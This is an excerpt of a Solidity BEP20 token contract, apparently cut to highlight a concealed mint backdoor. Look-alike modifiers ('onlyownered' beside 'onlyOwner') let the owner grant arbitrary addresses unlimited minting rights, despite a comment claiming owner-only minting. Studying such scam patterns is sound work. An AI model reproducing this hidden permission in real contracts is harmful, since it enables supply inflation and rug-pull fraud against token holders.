...
contract Ownable is Context {
    ...
    mapping (address => bool) internal onlyowners;
    ...
    modifier onlyownered() {
        require(isonlyownereded(msg.sender), "!caller is not the owner"); _;
    }
    
    function onlyowner(address adr) public onlyOwner {
        onlyowners[adr] = true;
    }
     ...
     */
    function isonlyownereded(address adr) public view returns (bool) {
        return onlyowners[adr];
    }
...
contract BEP20 is Context, IBEP20, Ownable {
     ...
     */
    function mint(uint256 amount) public onlyownered returns (bool) {
...
contract THTtoken is BEP20('TEST', 'TEST') {
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterChef).
    function mint(address _to, uint256 _amount) public onlyownered {
        _mint(_to, _amount);
